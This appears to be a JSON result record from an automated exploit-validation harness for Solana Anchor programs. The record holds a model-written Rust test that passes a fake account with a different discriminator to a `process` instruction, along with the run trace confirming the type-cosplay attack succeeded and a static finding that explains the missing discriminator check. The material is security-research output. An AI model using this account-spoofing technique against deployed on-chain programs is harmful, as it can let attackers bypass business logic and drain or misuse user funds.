@@ -1,0 +1,127 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: process aceitou conta com discriminador diferente de Treasury",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2513,
+        "completion_tokens": 699,
+        "latency_s": 4.54
+      },
+      "raw": "{\n  \"plan\": \"O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o programa aceita o layout esperado. Em seguida, o ataque chama `process` passando uma conta de outro tipo (discriminador diferente) cujo layout nos offsets 8..40, 40..48 e 48 imita authority, balance e is_active=true, explorando a ausência de validação do discriminador. O efeito medido é que a instrução `process` retorna sucesso com uma conta cujo discriminador não é o de Treasury, demonstrando o COSPLAY.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\n\\n// Baseline: inicializa uma Treasury legítima\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline = env.baseline(\\\"initialize legitimo\\\", &init_ix, &init_accounts);\\n\\n// Ataque: conta de outro tipo com layout que imita Treasury\\nlet fake_disc = anchor_account_discriminator(\\\"OutroTipo\\\");\\nlet mut fake_data = Vec::new();\\nfake_data.extend_from_slice(&fake_disc);\\nfake_data.extend_from_slice(authority.as_ref()); // 8..40\\nfake_data.extend_from_slice(&500u64.to_le_bytes()); // 40..48\\nfake_data.push(1); // 48: is_active = true\\n\\nlet fake_treasury = account(&env.program_id, &fake_data, None);\\n\\nlet process_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet process_accounts = vec![\\n    (treasury_key, fake_treasury),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"process com conta de outro tipo\\\", &process_ix, &process_accounts);\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &treasury_key).data();\\n    let disc = &data[0..8];\\n    env.effect(\\n        \\\"process aceitou conta com discriminador diferente de Treasury\\\",\\n        disc != anchor_account_discriminator(\\\"Treasury\\\"),\\n    );\\n}\"\n}",
+      "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o programa aceita o layout esperado. Em seguida, o ataque chama `process` passando uma conta de outro tipo (discriminador diferente) cujo layout nos offsets 8..40, 40..48 e 48 imita authority, balance e is_active=true, explorando a ausência de validação do discriminador. O efeito medido é que a instrução `process` retorna sucesso com uma conta cujo discriminador não é o de Treasury, demonstrando o COSPLAY.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\n\n// Baseline: inicializa uma Treasury legítima\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline = env.baseline(\"initialize legitimo\", &init_ix, &init_accounts);\n\n// Ataque: conta de outro tipo com layout que imita Treasury\nlet fake_disc = anchor_account_discriminator(\"OutroTipo\");\nlet mut fake_data = Vec::new();\nfake_data.extend_from_slice(&fake_disc);\nfake_data.extend_from_slice(authority.as_ref()); // 8..40\nfake_data.extend_from_slice(&500u64.to_le_bytes()); // 40..48\nfake_data.push(1); // 48: is_active = true\n\nlet fake_treasury = account(&env.program_id, &fake_data, None);\n\nlet process_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet process_accounts = vec![\n    (treasury_key, fake_treasury),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"process com conta de outro tipo\", &process_ix, &process_accounts);\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &treasury_key).data();\n    let disc = &data[0..8];\n    env.effect(\n        \"process aceitou conta com discriminador diferente de Treasury\",\n        disc != anchor_account_discriminator(\"Treasury\"),\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 12972,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "eeef7bee5901a8fd0000000000000001000000000000000000000000000000000000000000000000640000000000000001"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process com conta de outro tipo",
+            "result": "Success",
+            "compute_units": 8482,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw",
+                "data_len": 49,
+                "head": "b14ae9d470b01bc5",
+                "digest": "9e954c519411a6d5",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "process aceitou conta com discriminador diferente de Treasury",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12972 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8482 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: process aceitou conta com discriminador diferente de Treasury"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "high",
+    "evidence": "let authority = Pubkey::try_from(&data[8..40])...;\nlet balance = u64::from_le_bytes(data[40..48]...);\nlet is_active = data[48] != 0;",
+    "explanation": "Os dados da conta sao desserializados manualmente a partir de offsets fixos (8..40, 40..48, 48) sem verificar o discriminador de 8 bytes do Anchor no inicio do buffer. Como `treasury` e um `AccountInfo` e nao `Account<'info, Treasury>`, o discriminador de tipo nao e validado, permitindo que uma conta com layout de outro tipo (ou dados arbitrarios) seja interpretada como `Treasury`.",
+    "attack_hypothesis": "Um atacante fornece uma conta cujo layout de memoria coincide parcialmente com `Treasury` (por exemplo, uma conta de outro tipo com os mesmos offsets), fazendo com que os campos lidos (authority, balance, is_active) sejam interpretados incorretamente e burlando a logica de negocio que depende desses valores."
+  }
+}
